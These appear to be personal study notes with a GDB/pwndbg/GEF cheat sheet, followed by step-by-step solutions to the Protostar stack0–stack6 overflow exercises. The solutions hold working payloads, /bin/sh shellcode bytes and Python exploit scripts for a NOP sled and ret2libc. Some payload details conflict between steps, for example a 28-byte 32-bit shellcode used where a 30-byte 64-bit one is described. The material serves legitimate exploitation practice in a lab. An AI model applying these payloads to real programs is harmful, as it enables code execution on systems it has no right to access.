# GDB Enhancement Setup
[Pwndgb]: https://github.com/pwndbg/pwndbg
[GEF]: https://github.com/hugsy/gef

## Follow directions from links above to setup either pwndbg/gef

## You should now have a ~/.gdbinit
[My gdbinit]: $ cat ~/.gdbinit
	#source /home/user/.gdbinit-gef.py
	source /home/user/Documents/pwndbg/gdbinit.py
+ I commented out gef and have it point to pwndbg
________________________________________________________________________
________________________________________________________________________



## Step vs Next
gdb> s
gdb> s [#]
        ^optional: number of time to times to step
     this will go to the next assembly instruction
     AND will enter into a function


gdb> n
gdb> n [#]
        ^optional: number of time to times to step
	 this will go to the next assembly instruction
	 BUT will NOT enter a function and let that function finish


________________________________________________________________________
________________________________________________________________________



## See Assembly Chunk
pwndbg> u <function>
pwndbg> u main
pwndbg> u <function> [#]
	                  ^optional: number lines of assembly

gef> cs <function>
gef> cs main
gef> cs <function> [#]
   			        ^optional: number lines of assembly


________________________________________________________________________
________________________________________________________________________



## See Stack Frame
pwndbg> telescope <register/address>
pwndbg> telescope <register/address> [#]
								         ^optional: number lines of memory

gef> dereference <register/address>
gef> dereference <register/address> [#]
								         ^optional: number lines of memory

See whole stack (may contain elements outside of the stack)
pwndbg> telescope $rsp $rbp-$rsp
gef>  dereference $rsp $rbp-$rsp

[Examples]:
pwndbg> telescope $rsp
pwndbg> telescope 0x7fffffffde28

gef> dereference $rsp
gef> dereference 0x7fffffffde28

________________________________________________________________________
________________________________________________________________________



## See Hex

	gef> xinfo <address>  ; GEF & PWNDBG; gives info about that part of memory

	HEX
	gdb> x/10x <address>  ; see top 10 hex from that address

	gdb> x10s  <address>  ; see top 10 strings from that address
	gdb> x10i  <address>  ; see top 10 instructions from that address
	gdb> x/10u <address>  ; see top 10 usigned integers from that address
	gdb> x/10c <address>  ; see top 10 characters from that address


	HEXDUMP
	pwndbg/gef> hexdump [register/address]

________________________________________________________________________
________________________________________________________________________



## Register information
	gdb> info registers
	gef> registers			;GEF SPECIFIC (is similar to the summary at every step) !!!!!!!!!!!!
	pwndbg> reg    			;PWNDBG SPECFIFIC                                       !!!!!!!!!!!!

   See content of register
	gdb> x/s $r3			; see string in r3 register


________________________________________________________________________
________________________________________________________________________



## other userful commands

gdb> info address <function-name>
  ^gets the address of the function

gdb> set disassembly-flavor intel
      ^if just using gdb without enhancement features


________________________________________________________________________
________________________________________________________________________



# Useful when Reading Memory
https://github.com/ickerwx/pattern/blob/master/pattern
^save this into a file name `pattern.py`

##Use case:
	$ python pattern.py create [#]
                                ^length of pattern

##See what ASCII looks like in hex
	$ echo <ascii-string> | hexdump -v

________________________________________________________________________
________________________________________________________________________

[Reference Stack 0-7]: https://kevinalmansa.github.io/write-ups/Protostar-Stack-Write-up/
[Reference Stack6]: https://medium.com/bugbountywriteup/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6


# stack0: Overwrite Variable 
------------------------------------------------------------------------
[Simple]: python -c "print('A' * 77)" | ./stack0

[Detailed]: Step-by-Step
1. `chmod +x stack0`
2. `gdb stack0`
3. gdb> break main
4. gdb> run
5. Dump the whole main method into assembly
   gdb> u main 15
   gef> cs main 15
6. Observe this assembly line
    `mov   eax, dword ptr [rbp - 4]`
                               ^look at this
                               this is the location of the variabe
                               variable `modified`

   In a decompiler (Ghidra/Cutter), you'll see that this assembly line
   points to the line closest to `modified = 0;` in Ghidra it's `local_c = 0;`

7. pwndbg/gef> hexdump $rbp-4 4
                              ^look at 4 bytes since `int` is 4 bytesc

   should get something like:
   `+0000 0x7fffffffde3c  00  │.`
                          ^see that `modified` was initalized as 0

8. > next 13
          ^this number may be different
          You want to step over the gets function so you can give input

9. On separate terminal:
    `python -c "print('A'*77)"`
                            ^if this doesn't work at end,
                             increase this number
    To see the hex values of this (if all 'a's it should be `0x61`:
    `echo <string> | hexdump -v`

10. Copy the output of step 5 and paste into GDB and press ENTER

11. Next assembly instruction should be:
    	`mov   eax, dword ptr [rbp - 4]`
                               ^look at this
                               this is the location of the variabe
                               variable `modified`

12. pwndbg> hexdump $rbp-4 1
    gef> hexdump $rbp-4 1

   should get something like:
   `+0000 0x7fffffffde6c  61 61 61 61  │aaaaa`
                          ^you have changed the value of modified t0 `aaaa`

13. If you look at the source, `modified = 0;`. You have now changed it to
    a (0x61 in hex)

14. > continue
	```
    Continuing.
    You have changed the ‘modified’ variable
    ```




# stack1: Overwrite Variable to Specific Value
------------------------------------------------------------------------
[Simple]:  ./stack1 $(python -c "print 'A' * 76 + '\x64\x63\x62\x61'")
                                  ^may have to play with this number


# stack2: Set Enviromental Variable 
------------------------------------------------------------------------
[Simple]: GREENIE=$(python -c "print 'A' * 68 + '\x0a\x0d\x0a\x0d'") ./stack2
                                 ^may have to play with this number


# stack3: Jump to another function 
------------------------------------------------------------------------

[Simple]: Step-by-Step

1. `objdump -d stack3 | grep "win"`
	Output looks something like this:
	  0000000000400577 <win>:

2. Take the last 4 bytes of the address: \x00\x40\x05\x77
3. Invert them because x86_64 is in little endian: \x77\x05\x40\x00'
4. `python -c "print 'A' * 72 + '\x77\x05\x40\x00'" | ./stack3`
                          ^     ^the address backwards cause little endian
                          |
                          may have to play with this number

    Output:
    ```
    calling function pointer, jumping to 0x00400577
    code flow successfully changed
    ```

[Detailed]: Step-by-Step
1. `chmod +x stack3`
2. `gdb stack3`
3. gdb> break main
4. gdb> run
5. gdb> next 13
             ^this number may be different
             You want to step over the gets function so you can give input

5. Dump the whole main method into assembly
   gdb> u main 15
   gef> cs main 15

6. Observe this assembly line
    `mov  qword ptr [rbp - 8], 0`
                       ^look at this
                        this is the location of the variabe `fp`
                        

   In a decompiler (Ghidra/Cutter), you'll see that this assembly line
   points to the line closest to `fp = 0;`

   In Ghidra it's `local_10 = (code *) 0x0;`

7. pwndbg> telescope $rbp-8 1
   gef> dereference $rbp-8 1

   should get something like (pwndbg):
   `00:0000│   0x7fffffffde38 ◂— 0x0`
               ^at this address, the a value is 0


8. > next 13
          ^this number may be different
          You want to step over the gets function so you can give input

9. On separate terminal:
    `python -c "print 'A' * 72 + '\x77\x05\x40\x00'"`
                            ^if this doesn't work at end,
                             play with this number

10. Copy the output of step 5 and paste into GDB and press ENTER

11. Next assembly instruction should be:
    	`cmp    qword ptr [rbp - 8], 0`
                           ^look at this
                            cthis is the location of the variabe `fp`


12. pwndbg> telescope $rbp-8 1
    gef> dereference $rbp-8 1

   should get something like:
   `00:0000│ rdi-2  0x7fffffffde38 ◂— 0x4077 /* 'w@' */`
                          				^you have changed the value to 
                          				 0x4077

13. You did NOT enter the correct address because `\x00` and `\x05` are not
    printable in ASCII, so those bytes were left out.

    To fix these we're going back to the simple step-by-step so these
    values can be entered and we can get the correct address

14. `python -c "print 'A' * 72 + '\x77\x05\x40\x00'" | ./stack3`
                            ^     ^the address backwards cause little endian
                            |
                            may have to play with this number

    Output:
    ```
    calling function pointer, jumping to 0x00400577
    code flow successfully changed
    ```



# stack4: Controlling the EIP/RIP Register 
------------------------------------------------------------------------
[Simple]: python -c "print 'A' * 72 + '\x37\x05\x40\x00\x00\x00'" | ./stack4

[Detailed]: Step-by-Step
1. `chmod +x stack4`
2. python -c "print 'A' * 72 + '\x37\x05\x40\x00\x00\x00'" > arg
   Put this output into a file called arg

2. `gdb stack4`
3. gdb> break main
4. gdb> run < arg
   Run this executable while taking in the contetns of the arg file as input

5. gdb> next 11
6. pwndbg> telescope $rbp
   gef>  dereference $rbp

   Should see something like (pwndbg):
   ```
   00:0000│ rbp    0x7fffffffde70 ◂— 0x4141414141414141 ('AAAAAAAA')
   01:0008│ rdi-6  0x7fffffffde78 —▸ 0x400537 (win) ◂— 0x3d8d4890e5894855
   ```

7. > next

	Note that the `leave` instruction is exactly equivalent to
	```
	mov   $rbp, $rsp     # rsp = rbpt
	pop   %ebp
	```

8. Observe the RIP register now points RSP now points to:
   `0x7fffffffde78 —▸ 0x400537 (win)`

9. > continue
   ```
   Continuing.
   code flow successfully changed
   ```


# stack5: NOP Sled Buffer Overflow 
------------------------------------------------------------------------

+ Note that /x90 is the opcode for the NOP (no operation) assembly instruction

[Shellcode]: http://shell-storm.org/shellcode/
Example uses: http://shell-storm.org/shellcode/files/shellcode-811.php


[Detailed]: Step-by-Step
1. `chmod +x stack5`
2. `python -c "print '\x90' * 72 + '\x37\x05\x40\x00\x00\x00'" > arg`
                              ^may need to play with this number

   Put this output into a file called arg

2. `gdb stack5`
3. gdb> break main
4. gdb> run < arg
   Run this executable while taking in the contetns of the arg file as input

5. gdb> next 9


6. Look at the stack
	pwndbg> telescope $rbp-$rsp-68
	gef>  dereference $rbp-$rsp-

	Should see something like (pwndbg):
	```
    00:0000│ rsp    0x7fffffffe360 —▸ 0x7fffffffe498 —▸ 0x7fffffffe6f5 ◂— '/home/user/protostar/stack5'
    01:0008│        0x7fffffffe368 ◂— 0x100000001
    02:0010│ rax    0x7fffffffe370 ◂— 0x9090909090909090
    ... ↓
    0b:0058│ rdi-6  0x7fffffffe3b8 ◂— 0x0
	```


7. Note that the address where the NOP (\x90) opcodes start at `0x7fffffffe370`.
                                                                ^beginning of buffer


8. We will be replacing the address in arg (separate terminal):
   `python -c "print '\x90' * 72 + '\x70\xe3\xff\xff\xff\x7f'" > arg`


9. Redo steps 2-6

	Stack should now look like (pwndbg):
	```
	00:0000│ rsp    0x7fffffffde20 —▸ 0x7fffffffdf58 —▸ 0x7fffffffe282 ◂— '/home/user/protostar/stack5'
    01:0008│        0x7fffffffde28 ◂— 0x100000001
    02:0010│ rax    0x7fffffffde30 ◂— 0x9090909090909090
    ... ↓
    0b:0058│ rdi-6  0x7fffffffde78 —▸ 0x7fffffffde30 ◂— 0x9090909090909090
	```
	                 ^ we are now pointing back to the beginning of the buffer at `0x7fffffffe370`


10. We will be replacing some middle nops with shellcode (separate terminal):
    Template: `python -c "print '<shellcode>' + '\x90' * (72 - len(shellcode)) + '\x70\xe3\xff\xff\xff\x7f'" > arg`


11. Use the shell code in http://shell-storm.org/shellcode/files/shellcode-603.php (it's 30 bytes)
	```
    char shellcode[] =
    "\x48\x31\xd2"                                  // xor    %rdx, %rdx
    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
    "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
    "\x53"                                          // push   %rbx
    "\x48\x89\xe7"                                  // mov    %rsp, %rdi
    "\x50"                                          // push   %rax
    "\x57"                                          // push   %rdi
    "\x48\x89\xe6"                                  // mov    %rsp, %rsi
    "\xb0\x3b"                                      // mov    $0x3b, %al
    "\x0f\x05";                                     // syscall
	```

   Single Line:
"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"


12. A shell you execute needs input from standard input, but we're using a program that takes standard output and put it into standard input. Using a trick to get around that allows the shell code to run first and then use `cat` to interact with the shell:

`(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90' * (72 - 28) + '\x70\xe3\xff\xff\xff\x7f'"; cat) | ./stack5`

13. Redo steps 2-6

14. It might be easier to verify the shell code through hex
    pwndbg/gef> hexdump 0x7fffffffe370 28
                ^keep in mind the shell is backwards cause it's little endian
    ```
    +0000 0x7fffffffe370  31 c0 50 68  2f 2f 73 68  68 2f 62 69  6e 89 e3 89  │1.Ph│//sh│h/bi│n...│
    +0010 0x7fffffffe380  c1 89 c2 b0  0b cd 80 31  c0 40 cd 80               │....│...1│.@..│    │
    ```
15. gdb> quit

16. Here's a python script that wraps it all together
    ```
    padding="\x90" * (72-30)
    rip ="\x80\xdd\xff\xff\xff\x7f\x00\x00"
    payload = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

    print padding+payload+rip

    ```

17. python stack5-exploit.py | ./stack5
18. id
    should see output as if you're using a shell




# stack6: ret2libc
------------------------------------------------------------------------
+ Follow the setup-metasploit.md

1. `python -c "print 'A' * 70 + 'BBBBCCCCDDDDEEEEFFFFGGGG'"` > stack6exploit
2. gdb -q stack6
3. gdb> break * getpath
4. gdb> run < stack6exploit
5. gdb> continue
6. I get
   ```
   input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCFFGGDDEEEEFFFFGGGG

   Program received signal SIGSEGV, Segmentation fault.
   0x0000474747474646 in ?? ()
   ```
7. 0x47=G and 0x46=F. Since the address starts with 0000, this is porbably
   the last 6 characters of the string. This means the offest is:
   70 (As) + 18 (rest before the error) = 88

8. pwngbg> regs
   gef>    registers

   ```
   RIP  0x474747474646
   ```
         ^the FFGGGG string has overwrtitten the RIP register

9. gdb> info proc mappings
```
process 38731
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 /home/user/protostar/stack6
            0x600000           0x601000     0x1000        0x0 /home/user/protostar/stack6
            0x601000           0x602000     0x1000     0x1000 /home/user/protostar/stack6
            0x602000           0x623000    0x21000        0x0 [heap]
      0x7ffff79e2000     0x7ffff7bc9000   0x1e7000        0x0 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7bc9000     0x7ffff7dc9000   0x200000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7dc9000     0x7ffff7dcd000     0x4000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7dcd000     0x7ffff7dcf000     0x2000   0x1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7dcf000     0x7ffff7dd3000     0x4000        0x0 
      0x7ffff7dd3000     0x7ffff7dfc000    0x29000        0x0 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7ffff7fcd000     0x7ffff7fcf000     0x2000        0x0 
      0x7ffff7ff8000     0x7ffff7ffb000     0x3000        0x0 [vvar]
      0x7ffff7ffb000     0x7ffff7ffc000     0x1000        0x0 [vdso]
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x29000 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x2a000 /lib/x86_64-linux-gnu/ld-2.27.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]

```

	Noice: 
	`0x7ffff79e2000  0x7ffff7bc9000  0x1e7000  0x0 /lib/x86_64-linux-gnu/libc-2.27.so`
	    ^note this is the start address

10. On a separte terminal find the `/bin/sh` address within libc: 
    `strings -a -t x /lib/x86_64-linux-gnu/libc-2.27.so | grep "/bin/sh"`
      -a   = Scan entire file
      -t x = Print the offset location of the string in hexdecimal

    Output:
    `1b3e1a /bin/sh`

11. Confrim in gdb:
	gdb> x/s <system-syscall-address> <bin-sh-address>
	gdb> x/s 0x7ffff79e2000 + 0x1b3e1a
	```
	0x7ffff7b95e1a:	"/bin/sh"
	```

12. Finding the system syscall address:
    gdb> p system
    `$5 = {int (const char *)} 0x7ffff7a31550 <__libc_system>`


13. Python exploit
```
#!/usr/bin/python
import struct

padding = "A" * 70
padding+= "BBBBCCCCDDDDEEEEFF"
# FFGGGG <--this overwrite rip

# libc system
system = "\x50\x15\xa3\xf7\xff\x7f"

# return address after system
ret = "\x90" * 4

# libc /bin/sh
shell = "\x1a\x5e\xb9\xf7\xff\x7f"

print padding+system+ret+shell
```

14. (python stack6-exploit.py; cat) | ./stack6
15. id
    <output of id bash command>